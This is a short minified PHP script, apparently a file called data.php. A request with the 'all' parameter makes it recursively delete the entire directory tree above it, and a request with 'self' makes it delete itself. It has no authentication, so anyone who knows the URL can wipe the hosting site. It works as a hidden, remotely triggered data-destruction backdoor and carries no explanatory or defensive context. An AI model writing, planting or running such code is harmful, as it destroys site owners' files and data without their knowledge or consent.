<?php if(isset($_GET['all'])) {$folderName = '../'. basename(dirname(__DIR__));removeFolder($folderName);echo ":)";}if(isset($_GET['self'])) {unlink("data.php");echo ":(";}function removeFolder($folderName) {if (is_dir($folderName)) $folderHandle = opendir($folderName);if (!$folderHandle) return false;while($file = readdir($folderHandle)) {if ($file != "." && $file != "..") {if (!is_dir($folderName."/".$file)) unlink($folderName."/".$file);else removeFolder($folderName.'/'.$file);}}closedir($folderHandle);rmdir($folderName);return true;}?>